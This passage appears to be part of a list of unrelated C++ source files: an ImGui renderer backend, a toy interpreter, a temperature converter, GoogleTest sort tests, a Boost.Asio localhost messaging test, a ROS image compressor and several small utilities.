or already shutdown?\");\n    ImGuiIO& io = ImGui::GetIO();\n\n    ImGui_ImplSDLRenderer2_DestroyDeviceObjects();\n\n    io.BackendRendererName = nullptr;\n    io.BackendRendererUserData = nullptr;\n    io.BackendFlags &= ~ImGuiBackendFlags_RendererHasVtxOffset;\n    IM_DELETE(bd);\n}\n\nstatic void ImGui_ImplSDLRenderer2_SetupRenderState(SDL_Renderer* renderer)\n{\n\t// Clear out any viewports and cliprect set by the user\n    // FIXME: Technically speaking there are lots of other things we could backup/setup/restore during our render process.\n\tSDL_RenderSetViewport(renderer, nullptr);\n\tSDL_RenderSetClipRect(renderer, nullptr);\n}\n\nvoid ImGui_ImplSDLRenderer2_NewFrame()\n{\n    ImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"Context or backend not initialized! Did you call ImGui_ImplSDLRenderer2_Init()?\");\n\n    if (!bd->FontTexture)\n        ImGui_ImplSDLRenderer2_CreateDeviceObjects();\n}\n\nvoid ImGui_ImplSDLRenderer",
    "#include \"Executor.hpp\"\n\n// REMEMBER - Tokens are global!!!\n\nvoid Execute()\n{\n    for(LUCID_LOOP_SIZE i = 0; i < tokens.size(); i++)\n    {\n        if(tokens[i].type == TokenType::SEMICOLON) continue;\n\n        switch(tokens[i].type)\n        {\n            case TokenType::VAR_INIT:\n                f_InitVariable(i); break;\n            \n            case TokenType::VAR_GET:\n                f_GetSetVariable(i); break;\n            \n            case TokenType::VAR_NAME:\n            {\n                if(FindVariable(tokens[i--].value) == UINT16_MAX)\n                    f_InitVariable(i);\n                else\n                    f_GetSetVariable(i);\n            }\n            break;\n\n            case TokenType::AT_SYM:\n                SpecialArguments(i); break;\n            \n            default: break;\n        }\n    }\n}\n\nvoid f_InitVariable(LUCID_LOOP_SIZE &i)\n{\n    Variable var;\n    var.name = tokens[++i].value;\n    if(tokens[++i].type == TokenType::EQUALS)\n        UpdateValue(var.value, i);\n    else\n        i--;\n\n    variables.push_back(var);\n}\n\nvoid f_GetSetVariable(LUCID_LOOP_SIZE &i)\n{\n    LUCID_LOOP_SIZE var_id;\n    bool var_error = false;\n    i++;\n    var_id = FindVariable(tokens[i].value);\n    if(var_id == UINT16_MAX) var_error = true;\n\n    if(var_error) {\n        printf(\"A variable \\\"%s\\\" does not exist.\\n\", tokens[i].value.c_str());\n        return;\n    }\n\n    if(tokens[++i].type == TokenType::EQUALS)\n        UpdateValue(variables[var_id].value, i);\n}\n\nvoid UpdateValue(std::string &var, LUCID_LOOP_SIZE &i)\n{\n    LUCID_DATA_SIZE temp_1 = 0, temp_2 = 0;\n    std::string result;\n    bool second_math = special_arguments[SpecialArgs::FAST_MATH];\n    bool special_math = false;\n    i++;\n\n    LUCID_LOOP_SIZE og_i = i;\n\n    // goto function\n    second_round:\n    while(i < tokens.size() && MathLoop(tokens[i].type))\n    {\n        switch(tokens[i].type)\n        {\n            case TokenType::NUMBER: break;\n            \n            case TokenType::PLUS_SYM: {\n                if(second_math) {\n                    MathUpdateTokens(i, MathAdd);\n                    i--;\n                }\n            } break;\n\n            case TokenType::MINUS_SYM: {\n                if(second_math) {\n                    MathUpdateTokens(i, MathSubtract);\n                    i--;\n                }\n            } break;\n\n            case TokenType::MULTIPLY_SYM: {\n                MathUpdateTokens(i, MathMultiply);\n                special_math = true;\n                i--;\n            } break;\n\n            case TokenType::DIVIDE_SYM: {\n                MathUpdateTokens(i, MathDivide);\n                special_math = true;\n                i--;\n            } break;\n\n            default: break;\n        }\n        i++;\n    }\n\n    if(special_math && second_math == false) {\n        second_math = true;\n        i = og_i;\n        goto second_round;\n    }\n\n    var = tokens[--i].value;\n}\n\nLUCID_LOOP_SIZE FindVariable(const std::string &var)\n{\n    for(LUCID_LOOP_SIZE i = 0; i < variables.size(); i++) {\n        if(variables[i].name == var) {\n            return i;\n        }\n    }\n    return UINT16_MAX;\n}\n\nvoid MathUpdateTokens(const LUCID_LOOP_SIZE i, LUCID_DATA_SIZE(*func)(LUCID_DATA_SIZE, LUCID_DATA_SIZE))\n{\n    LUCID_DATA_SIZE temp_1 = stoi(tokens[i-1].value);\n    LUCID_DATA_SIZE temp_2 = stoi(tokens[i+1].value);\n    tokens[i-1] = { .type = TokenType::NUMBER, .value = std::to_string(func(temp_1, temp_2)) };\n    tokens.erase(tokens.begin()+i);\n    tokens.erase(tokens.begin()+i);\n}\n\nbool MathLoop(TokenType type)\n{\n    switch(type)\n    {\n        case TokenType::NUMBER: return true;\n        case TokenType::PLUS_SYM: return true;\n        case TokenType::MINUS_SYM: return true;\n        case TokenType::MULTIPLY_SYM: return true;\n        case TokenType::DIVIDE_SYM: return true;\n        default: return false;\n    }\n}\n\nvoid SpecialArguments(LUCID_LOOP_SIZE &i)\n{\n    if(tokens[++i].value == \"fast_math\") special_arguments[0] = true;\n}\n\nLUCID_DATA_SIZE MathAdd(LUCID_DATA_SIZE a, LUCID_DATA_SIZE b) { return a + b; }\nLUCID_DATA_SIZE MathSubtract(LUCID_DATA_SIZE a, LUCID_DATA_SIZE b) { return a - b; }\nLUCID_DATA_SIZE MathMultiply(LUCID_DATA_SIZE a, LUCID_DATA_SIZE b) { return a * b; }\nLUCID_DATA_SIZE MathDivide(LUCID_DATA_SIZE a, LUCID_DATA_SIZE b) { return a / b; }",
    "#include <iostream>\n#include <cmath>\nusing namespace std;\n\nconst int scale_count = 4;\nconst char SCALES[scale_count] = {'F', 'C', 'K', 'R'};\n\ndouble fahrenheitToCelsius(double f) {\n    return (f - 32.0) * 5.0 / 9.0;\n}\n\ndouble celsiusToFahrenheit(double c) {\n    return c * 9.0 / 5.0 + 32.0;\n}\n\ndouble kelvinToCelsius(double k) {\n    return k - 273.15;\n}\n\ndouble celsiusToKelvin(double c) {\n    return c + 273.15;\n}\n\ndouble reaumurToCelsius(double r) {\n    return r * 5.0 / 4.0;\n}\n\ndouble celsiusToReaumur(double c) {\n    return c * 4.0 / 5.0;\n}\n\ndouble convertTemperature(double value, char fromScale, char toScale) {\n    double celsius;\n\n    switch (fromScale) {\n        case 'F': celsius = fahrenheitToCelsius(value); break;\n        case 'C': celsius = value; break;\n        case 'K': celsius = kelvinToCelsius(value); break;\n        case 'R': celsius = reaumurToCelsius(value); break;\n        default: return -1; \n    }\n\n    switch (toScale) {\n        case 'F': return celsiusToFahrenheit(celsius);\n        case 'C': return celsius;\n        case 'K': return celsiusToKelvin(celsius);\n        case 'R': return celsiusToReaumur(celsius);\n        default: return -1; \n    }\n}\n\nbool isValidScale(char scale) {\n    for (int i = 0; i < scale_count; i++) {\n        if (scale == SCALES[i]) {\n            return true;\n        }\n    }\n    return false;\n}\n\nint main() {\n    double value;\n    char fromScale, toScale;\n\n    cout << \"Enter temperature value: \";\n    cin >> value;\n\n    cout << \"Enter source scale (F/C/K/R): \";\n    cin >> fromScale;\n    fromScale = toupper(fromScale);\n\n    cout << \"Enter target scale (F/C/K/R): \";\n    cin >> toScale;\n    toScale = toupper(toScale);\n\n    if (!isValidScale(fromScale) || !isValidScale(toScale)) {\n        cout << \"Invalid scale. Please use F, C, K, or R.\" << endl;\n        return 1;\n    }\n\n    double result = convertTemperature(value, fromScale, toScale);\n    \n    if (result == -1) {\n        cout << \"Error\" << endl;\n        return 1;\n    }\n\n    // Round to two decimal places\n    //result = round(result * 100.0) / 100.0;\n\n    cout << value << \" \" << fromScale << \" is \" << result << \" \" << toScale << endl;\n\n    return 0;\n}",
    "#include <iostream>\n#include <filesystem>\n#include <future>\n#include \"pcmreader.h\"\n\nint main()\n{\n    std::vector<std::string> filesPaths;\n    std::vector<std::future<std::tuple<int, std::vector<std::string>>>> futures;\n    std::string directoryPath = \"data_raw_32_rand_ch_offs\";\n\n    std::filesystem::directory_iterator dirIterator;\n    try {\n        dirIterator = std::filesystem::directory_iterator{directoryPath};\n    } catch (std::filesystem::filesystem_error &excp) {\n        std::cout << excp.what() << std::endl;\n        return 1;\n    }\n\n    for (auto & file : dirIterator) {\n        if (std::filesystem::is_directory(file)) {\n            std::cout << \"Directory contain another directory\" << std::endl;\n            return 1;\n        }\n        std::string filePath = file.path().string();\n        futures.push_back(async(&PCMReader::getCountOfBreaks, PCMReader(), filePath));\n        filesPaths.push_back(filePath);\n    }\n\n    if (filesPaths.size() == 0) {\n        std::cout << \"Directory is empty\" << std::endl;\n        return 1;\n    }\n\n    std::vector<int> countOfBreaks;\n    for (unsigned int i = 0; i < filesPaths.size(); i++) {\n        int countOfBreaksInFile;\n        std::vector<std::string> breaks;\n        std::tie(countOfBreaksInFile, breaks) = futures[i].get();\n        for (auto it = breaks.begin(); it != breaks.end(); it++) {\n            std::cout << *it;\n        }\n        countOfBreaks.push_back(countOfBreaksInFile);\n    }\n\n    for (unsigned int i = 0; i < countOfBreaks.size(); i++) {\n        std::cout << \"Count of breaks of file \" << filesPaths[i] << \": \" << countOfBreaks[i] << std::endl;\n    }\n    // thread t1(&PCMReader::getCountOfBreaks, PCMReader(), filesPaths[0]);\n    // thread t2(&PCMReader::getCountOfBreaks, PCMReader(), filesPaths[1]);\n    // thread t3(&PCMReader::getCountOfBreaks, PCMReader(), filesPaths[2]);\n    // thread t4(&PCMReader::getCountOfBreaks, PCMReader(), filesPaths[3]);\n    // thread t5(&PCMReader::getCountOfBreaks, PCMReader(), filesPaths[4]);\n    // thread t6(&PCMReader::getCountOfBreaks, PCMReader(), filesPaths[5]);\n    // thread t7(&PCMReader::getCountOfBreaks, PCMReader(), filesPaths[6]);\n    // thread t8(&PCMReader::getCountOfBreaks, PCMReader(), filesPaths[7]);\n    // t1.join();\n    // t2.join();\n    // t3.join();\n    // t4.join();\n    // t5.join();\n    // t6.join();\n    // t7.join();\n    // t8.join();\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_state_management\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"commands.h\"\n\nbool lfFile(std::set<std::string> *set)\n{\n    LOG(\"Looking for a file to read\");\n\n#ifdef __APPLE__\n    std::string command = \"ls\";\n    std::system(command.c_str());\n#elif _WIN32\n    std::string command = \"dir\";\n    ShellExecuteA(NULL, command.c_str(), NULL, NULL, NULL, SW_SHOWNORMAL);\n#else\n    std::string command = \"ls \";\n    std::system(command.c_str());\n#endif\n\n#ifdef _WIN32\n    FILE *pipe = _popen(command.c_str(), \"r\");\n    if (pipe == NULL)\n    {\n        perror(\"popen failed\");\n        return 1;\n    }\n#else\n    FILE *pipe = popen(command.c_str(), \"r\");\n    if (pipe == NULL)\n    {\n        perror(\"popen failed\");\n        return 1;\n    }\n#endif\n\n    // Read the output of the command line by line\n    char buffer[128];\n    while (fgets(buffer, sizeof(buffer), pipe) != NULL)\n    {\n        try\n        {\n            std::string txt = buffer;\n            if (txt.find(File_Extension) != std::string::npos)\n            {\n                // LOG(\"FOUND - \" << txt);\n                std::cout << \"Reading - \" << txt;\n                //! Remove '\\n'\n                if (txt.find('\\n') != std::string::npos)\n                    txt.pop_back();\n                fileRead(txt, set);\n            }\n        }\n        catch (const std::exception &e)\n        {\n            LOG(\"Error reading \" << buffer);\n            std::cerr << e.what() << '\\n';\n        }\n    }\n    LOG(\"Done files\");\n\n//  Close the pipe\n#ifdef _WIN32\n    _pclose(pipe);\n#else\n    pclose(pipe);\n#endif\n    return 0;\n}\n\nvoid fileRead(std::string filename, std::set<std::string> *set)\n{\n    std::ifstream file(filename);\n    if (!file.is_open())\n        throw std::runtime_error(\"Failed to open the file.\");\n\n    std::string text;\n    while (file >> text)\n    {\n        set->insert(text);\n    }\n    file.close();\n}\n\nvoid cdTo(std::string directory)\n{\n    // LOG(\"\\n\"<< directory << \" <----------\")\n    std::cout << \"\\n\"\n              << directory << std::endl;\n#ifdef _WIN32\n    if (_chdir(directory.c_str()) != 0)\n    {\n        std::cerr << \"Failed to change directory\" << std::endl;\n        throw std::exception();\n    }\n\n#else\n    if (chdir(directory.c_str()) != 0)\n    {\n        throw std::runtime_error(\"Failed to change directory.\");\n        throw std::exception();\n    }\n#endif\n\n    //* Write .gitignore\n    // std::ofstream file(\".gitignore\");\n    // if (!file.is_open())\n    //     throw std::runtime_error(\"Failed to write the file.\");\n\n    // std::string text = \"GitMe\";\n    // file << text;\n    // file.close();\n}\n",
    "#ifdef __linux\n#include \"linux_framebuffer.hpp\"\n\nvoid LinuxFrameBuffer::create_window_impl() {\n    this->display = XOpenDisplay(nullptr);\n\n    if (!this->display) {\n        exit(1);\n    }\n\n    this->root = DefaultRootWindow(this->display);\n    this->window = XCreateSimpleWindow(this->display, root, 0, 0, this->width, this->height, 1, 0, 0);\n\n    XStoreName(this->display, this->window, \"Snake++\");\n    XSelectInput(this->display, this->window, ExposureMask | KeyPressMask);\n    XMapWindow(this->display, this->window);\n\n    this->image = XCreateImage(display, DefaultVisual(display, 0), DefaultDepth(display, 0), ZPixmap, 0, nullptr, this->width, this->height, 32, 0);\n    this->image->data = (char *) malloc(this->width * this->height * sizeof(uint32_t));\n\n    this->gc = DefaultGC(this->display, 0);\n\n    wmDeleteMessage = XInternAtom(this->display, \"WM_DELETE_WINDOW\", False);\n    XSetWMProtocols(this->display, this->window, &wmDeleteMessage, 1);\n\n    this->set_running(true);\n}\n\nvoid LinuxFrameBuffer::render_impl() {\n    XPutImage(this->display, this->window, this->gc, this->image, 0, 0, 0, 0, this->width, this->height);\n    XFlush(this->display);\n}\n\nvoid LinuxFrameBuffer::handle_events_impl() {\n    XEvent event;\n\n    while (XPending(this->display) > 0 && this->should_run()) {\n        XNextEvent(this->display, &event);\n\n        switch (event.type) {\n            case Expose: {\n                this->render();\n                break;\n            }\n            case KeyPress: {\n                KeySym key = XLookupKeysym(&event.xkey, 0);\n                uint64_t keycode = static_cast<uint64_t>(key);\n\n                this->notify_keypress(keycode);\n                break;\n            }\n            case ClientMessage: {\n                if (static_cast<Atom>(event.xclient.data.l[0]) == this->wmDeleteMessage) {\n                    this->set_running(false);\n                }\n\n                break;\n            }\n        }\n    }\n}\n\nvoid LinuxFrameBuffer::write_pixel_impl(int x, int y, uint32_t color) {\n    assert(x >= 0 && x < this->width && y >= 0 && y < this->height);\n    ((uint32_t *) this->image->data)[y * this->width + x] = color;\n}\n\nLinuxFrameBuffer::~LinuxFrameBuffer()  {\n    if (this->image) {\n        this->image->f.destroy_image(this->image);\n    }\n\n    if (this->display) {\n        XDestroyWindow(this->display, this->window);\n        XCloseDisplay(this->display);\n    }\n}\n\n#endif // __linux\n",
    "#include <iostream>\r\n#include <string>\r\n#include \"gtest/gtest.h\"\r\n#include \"Sort.h\"\r\n\r\nusing PerformanceData = std::pair<int, std::string>;\r\n\r\n// \u30b9\u30b3\u30a2\u3092\u6607\u9806\u3067\u6bd4\u8f03\u3059\u308b\u305f\u3081\u306e\u95a2\u6570\r\ninline bool SA(const PerformanceData& a, const PerformanceData& b) {\r\n    return a.first < b.first;\r\n}\r\n\r\n// \u30b9\u30b3\u30a2\u3092\u964d\u9806\u3067\u6bd4\u8f03\u3059\u308b\u305f\u3081\u306e\u95a2\u6570\r\ninline bool SD(const PerformanceData& a, const PerformanceData& b) {\r\n    return a.first > b.first;\r\n}\r\n\r\n// \u540d\u524d\u3092\u6607\u9806\u3067\u6bd4\u8f03\u3059\u308b\u305f\u3081\u306e\u95a2\u6570\r\ninline bool NameA(const PerformanceData& a, const PerformanceData& b) {\r\n    return a.second < b.second;\r\n}\r\n\r\n// \u540d\u524d\u3092\u964d\u9806\u3067\u6bd4\u8f03\u3059\u308b\u305f\u3081\u306e\u95a2\u6570\r\ninline bool NameD(const PerformanceData& a, const PerformanceData& b) {\r\n    return a.second > b.second;\r\n}\r\n\r\n// \u7121\u52b9\u306a\u6bd4\u8f03\u95a2\u6570\r\nbool compareInvalid(const std::string& a, const std::string& b) {\r\n    return a < b;\r\n}\r\n\r\n// \u30ea\u30b9\u30c8\u304c\u7a7a\u306e\u5834\u5408\u306e\u30c6\u30b9\u30c8\r\n// \u671f\u5f85\u7d50\u679c: \u30bd\u30fc\u30c8\u5f8c\u3082\u30ea\u30b9\u30c8\u306e\u30b5\u30a4\u30ba\u304c0\u3067\u3042\u308b\u3053\u3068\r\nTEST(SortTest, TestifEmpty) {\r\n    DoublyLinkedList<PerformanceData> list;\r\n    list.Sort(SA);\r\n    EXPECT_EQ(0, list.Getsize());\r\n\r\n    list.Sort(SD);\r\n    EXPECT_EQ(0, list.Getsize());\r\n\r\n    list.Sort(NameA);\r\n    EXPECT_EQ(0, list.Getsize());\r\n\r\n    list.Sort(NameD);\r\n    EXPECT_EQ(0, list.Getsize());\r\n}\r\n\r\n// \u30ea\u30b9\u30c8\u306b\u4e00\u3064\u306e\u8981\u7d20\u304c\u3042\u308b\u5834\u5408\u306e\u30c6\u30b9\u30c8\r\n// \u671f\u5f85\u7d50\u679c: \u30bd\u30fc\u30c8\u5f8c\u3082\u30ea\u30b9\u30c8\u306e\u30b5\u30a4\u30ba\u304c1\u3067\u3042\u308a\u3001\u8981\u7d20\u304c\u5909\u308f\u3089\u306a\u3044\u3053\u3068\r\nTEST(SortTest, TestSingleElement) {\r\n    DoublyLinkedList<PerformanceData> list;\r\n    PerformanceData data = { 10, \"User\" };\r\n    list.Insert(list.end(), data);\r\n    auto it = list.begin();\r\n\r\n    list.Sort(SA);\r\n    EXPECT_EQ(1, list.Getsize());\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n\r\n    list.Sort(SD);\r\n    EXPECT_EQ(1, list.Getsize());\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n\r\n    list.Sort(NameA);\r\n    EXPECT_EQ(1, list.Getsize());\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n\r\n    list.Sort(NameD);\r\n    EXPECT_EQ(1, list.Getsize());\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n}\r\n\r\n// \u30ea\u30b9\u30c8\u306b\u8907\u6570\u306e\u8981\u7d20\u304c\u3042\u308b\u5834\u5408\u306e\u30c6\u30b9\u30c8\r\n// \u671f\u5f85\u7d50\u679c: \u30bd\u30fc\u30c8\u5f8c\u3001\u30ea\u30b9\u30c8\u304c\u6b63\u3057\u304f\u30bd\u30fc\u30c8\u3055\u308c\u3066\u3044\u308b\u3053\u3068\r\nTEST(SortTest, TestMultipleElements) {\r\n    DoublyLinkedList<PerformanceData> list;\r\n    PerformanceData data = { 10, \"User\" };\r\n    PerformanceData data1 = { 20, \"User1\" };\r\n    list.Insert(list.end(), data);\r\n    list.Insert(list.end(), data1);\r\n\r\n    auto it = list.begin();\r\n    list.Sort(SA);\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n    ++it;\r\n    EXPECT_EQ(data1.first, (*it).first);\r\n    EXPECT_EQ(data1.second, (*it).second);\r\n\r\n    it = list.begin();\r\n    list.Sort(SD);\r\n    EXPECT_EQ(data1.first, (*it).first);\r\n    EXPECT_EQ(data1.second, (*it).second);\r\n    ++it;\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n\r\n    it = list.begin();\r\n    list.Sort(NameA);\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n    ++it;\r\n    EXPECT_EQ(data1.first, (*it).first);\r\n    EXPECT_EQ(data1.second, (*it).second);\r\n\r\n    it = list.begin();\r\n    list.Sort(NameD);\r\n    EXPECT_EQ(data1.first, (*it).first);\r\n    EXPECT_EQ(data1.second, (*it).second);\r\n    ++it;\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n}\r\n\r\n// \u540c\u3058\u30ad\u30fc\u3092\u6301\u3064\u8981\u7d20\u306e\u30c6\u30b9\u30c8\r\n// \u671f\u5f85\u7d50\u679c: \u30bd\u30fc\u30c8\u5f8c\u3082\u30ea\u30b9\u30c8\u306e\u9806\u5e8f\u304c\u6b63\u3057\u3044\u3053\u3068\r\nTEST(SortTest, TestSameKey) {\r\n    DoublyLinkedList<PerformanceData> list;\r\n    PerformanceData data = { 10, \"User\" };\r\n    PerformanceData data1 = { 10, \"User1\" }; // \u540c\u3058\u30ad\u30fc\r\n    list.Insert(list.end(), data);\r\n    list.Insert(list.end(), data1);\r\n\r\n    auto it = list.begin();\r\n    list.Sort(SA);\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n    ++it;\r\n    EXPECT_EQ(data1.first, (*it).first);\r\n    EXPECT_EQ(data1.second, (*it).second);\r\n\r\n    it = list.begin();\r\n    list.Sort(SD);\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n    ++it;\r\n    EXPECT_EQ(data1.first, (*it).first);\r\n    EXPECT_EQ(data1.second, (*it).second);\r\n\r\n    it = list.begin();\r\n    list.Sort(NameA);\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n    ++it;\r\n    EXPECT_EQ(data1.first, (*it).first);\r\n    EXPECT_EQ(data1.second, (*it).second);\r\n\r\n    it = list.begin();\r\n    list.Sort(NameD);\r\n    EXPECT_EQ(data1.first, (*it).first);\r\n    EXPECT_EQ(data1.second, (*it).second);\r\n    ++it;\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n}\r\n\r\n\r\n// \u30ea\u30b9\u30c8\u306e\u30bd\u30fc\u30c8\u30c6\u30b9\u30c8\r\n// \u671f\u5f85\u7d50\u679c: \u30ea\u30b9\u30c8\u3092\u518d\u5ea6\u30bd\u30fc\u30c8\u3057\u3066\u3082\u9806\u5e8f\u304c\u7dad\u6301\u3055\u308c\u308b\u3053\u3068\r\nTEST(SortTest, TestList) {\r\n    DoublyLinkedList<PerformanceData> list;\r\n    PerformanceData data = { 10, \"User\" };\r\n    PerformanceData data1 = { 20, \"User1\" };\r\n    list.Insert(list.end(), data);\r\n    list.Insert(list.end(), data1);\r\n\r\n    auto it = list.begin();\r\n    list.Sort(SA);\r\n    list.Sort(SA);\r\n    EXPECT_EQ(data.first, (*it).first);\r\n    EXPECT_EQ(data.second, (*it).second);\r\n    ++it;\r\n    EXPECT_EQ(data1.first, (*it).first);\r\n    EXPECT_EQ(data1.second, (*it).second);\r\n\r\n    it = list.begin();\r\n    list.Sort(SD);\r\n    list.Sort(SD);\r\n ",
    "#include <iostream>\n#include <boost/asio.hpp>\n#include <thread>\n#include <chrono>\n#include \"message.pb.h\"\n\nusing boost::asio::ip::tcp;\n\nint sender_counter = 0;\nint receiver_counter = 0;\n\n\nvoid send_messages(boost::asio::io_context& io_context, const std::string& server, const std::string& port) {\n    for (int i = 0; i < 100000; ++i) {\n\n        Person person;\n        person.set_name(\"Omer Faruk Okuyan\");\n        person.set_id(i + 1);  // Unique ID for each message\n        person.set_email(\"omerokuyan@taurob.com\");\n\n        // Serialize the object to a byte string\n        std::string serialized_data;\n        person.SerializeToString(&serialized_data);\n\n        // Resolve the server address and port\n        tcp::resolver resolver(io_context);\n        auto endpoints = resolver.resolve(server, port);\n\n        // Create and connect the socket\n        tcp::socket socket(io_context);\n        boost::asio::connect(socket, endpoints);\n\n        // Send the serialized data\n        boost::asio::write(socket, boost::asio::buffer(serialized_data));\n        sender_counter++;\n        //wait 10 microseconds\n        std::this_thread::sleep_for(std::chrono::microseconds(1)); // hz: 1mhz\n    }\n}\n\nvoid handle_client(tcp::socket socket) {\n    try {\n        std::array<char, 1024> buf;\n        boost::system::error_code error;\n\n        size_t len = socket.read_some(boost::asio::buffer(buf), error);\n        if (error == boost::asio::error::eof) {\n            return;\n        } else if (error) {\n            throw boost::system::system_error(error); // Some other error.\n        }\n\n        // Deserialize the data\n        Person person;\n        person.ParseFromArray(buf.data(), len);\n        receiver_counter++;\n\n        std::cout << \"Received message ID: \" << person.id() << std::endl;\n    } catch (std::exception& e) {\n        std::cerr << \"Exception in thread: \" << e.what() << std::endl;\n    }\n}\n\nvoid start_receiver(boost::asio::io_context& io_context, const std::string& port) {\n    tcp::acceptor acceptor(io_context, tcp::endpoint(tcp::v4(), std::stoi(port)));\n\n    std::cout << \"Receiver is running on port \" << port << std::endl;\n\n    for (int i = 0; i < 100000; ++i) {\n        tcp::socket socket(io_context);\n        acceptor.accept(socket);\n        handle_client(std::move(socket));\n    }\n}\n\nint main(int argc, char* argv[]) {\n    GOOGLE_PROTOBUF_VERIFY_VERSION;\n\n    try {\n        boost::asio::io_context io_context;\n\n        const std::string server = \"127.0.0.1\";\n        const std::string port = \"5005\";\n\n        std::thread receiver_thread(start_receiver, std::ref(io_context), port);\n        std::this_thread::sleep_for(std::chrono::seconds(1));  // Give the receiver a moment to start\n        std::thread sender_thread(send_messages, std::ref(io_context), server, port);\n\n        sender_thread.join();\n        receiver_thread.join();\n\n        if (sender_counter == receiver_counter) {\n            std::cout << \"Test passed. All messages were sent and received correctly.\" << std::endl;\n        } else {\n            std::cout << \"Test failed. Sender count: \" << sender_counter << \", Receiver count: \" << receiver_counter << std::endl;\n        }\n    } catch (std::exception& e) {\n        std::cerr << \"Exception: \" << e.what() << std::endl;\n    }\n\n    google::protobuf::ShutdownProtobufLibrary();\n\n    return 0;\n}\n",
    "#include \"../include/image_compressed/image_compressed.hpp\"\n\nint main(int argc, char** argv)\n{\n  Converter iC(argc, argv);\n  return true;\n}\n\nConverter::Converter(int argc, char** argv) : init_argc(argc), init_argv(argv)\n{\n  std::cout << \"[image] Start Converting ...\" << std::endl;\n  init();\n}\n\nConverter::~Converter()\n{\n  std::cout << \"[image] Ros shutdown\" << std::endl;\n}\n\nbool Converter::init()\n{\n  ros::init(init_argc, init_argv, \"image_coverter_node\");\n  if (!ros::master::check())\n  {\n    return false;\n  }\n  ros::start();\n  updateTopicList();\n\n  ros::NodeHandle nh;\n  nh.param(\"/image_compressed/quality\", quality, 95);\n  std::cout << \"[image] cv::IMWRITE_JPEG_QUALITY: \" << quality << std::endl;\n\n  start();\n  return true;\n}\n\nvoid Converter::start()\n{\n  ros::Rate loop_rate(100);\n  while (ros::ok())\n  {\n    updateTopicList();\n    ros::spinOnce();\n    loop_rate.sleep();\n  }\n}\n\nvoid Converter::initializeSubscriber()\n{\n  ros::NodeHandle nh;\n  for (int i = 0; i < image_topics.size(); i++)\n  {\n    image_subscriber.push_back(nh.subscribe<sensor_msgs::Image>(\n        image_topics[i], 1, boost::bind(&Converter::convertImageToCompressedImage, this, _1, i)));\n  }\n}\n\nvoid Converter::initializePublisher()\n{\n  ros::NodeHandle nh;\n  for (int i = 0; i < image_topics.size(); i++)\n  {\n    std::string topic_index = image_topics[i] + \"/compressed\";\n    image_publisher.push_back(nh.advertise<sensor_msgs::CompressedImage>(topic_index, 1));\n  }\n}\n\nvoid Converter::updateTopicList()\n{\n  ros::master::V_TopicInfo topics;\n  std::vector<std::string> new_image_topics;\n\n  if (ros::master::getTopics(topics))\n  {\n    for (const auto& topic : topics)\n    {\n      if (topic.datatype == \"sensor_msgs/Image\")\n      {\n        new_image_topics.push_back(topic.name);\n      }\n    }\n\n    for (const auto& topic : previous_image_topics)\n    {\n      if (std::find(new_image_topics.begin(), new_image_topics.end(), topic) == new_image_topics.end())\n      {\n        std::cout << \"[image] Lost Topic: \" << topic << \" Publishing Stopped.\" << std::endl;\n      }\n    }\n\n    for (const auto& topic : new_image_topics)\n    {\n      if (std::find(previous_image_topics.begin(), previous_image_topics.end(), topic) == previous_image_topics.end())\n      {\n        std::cout << \"[image] Found New Topic: \" << topic << \" Publishing topic as: \" << topic << \"/compressed\"\n                  << std::endl;\n      }\n    }\n\n    previous_image_topics = new_image_topics;\n    image_topics = new_image_topics;\n\n    initializeSubscriber();\n    initializePublisher();\n  }\n  else\n  {\n    ROS_ERROR(\"[image] Failed to retrieve topics.\");\n  }\n}\n\nvoid Converter::convertImageToCompressedImage(const sensor_msgs::ImageConstPtr& msg, int num)\n{\n  try\n  {\n    cv_bridge::CvImagePtr cv_ptr = cv_bridge::toCvCopy(msg, sensor_msgs::image_encodings::BGR8);\n    std::vector<int> params;\n    params.push_back(cv::IMWRITE_JPEG_QUALITY);\n    params.push_back(quality);\n\n    sensor_msgs::CompressedImage compressed_msg;\n    compressed_msg.header = msg->header;\n    compressed_msg.format = \"jpeg\";\n\n    cv::imencode(\".jpg\", 